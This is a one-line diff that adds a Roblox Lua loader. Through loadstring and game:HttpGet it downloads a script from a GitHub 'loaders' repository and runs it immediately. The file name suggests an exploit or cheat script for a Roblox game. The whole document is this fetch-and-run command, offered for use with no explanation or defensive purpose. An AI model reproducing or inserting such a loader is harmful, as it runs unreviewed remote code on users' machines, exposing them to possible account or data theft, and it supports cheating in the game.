@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/qol-spin-a-kpop-idol-spam7-cqf8dje3o0kv2z.lua"))()
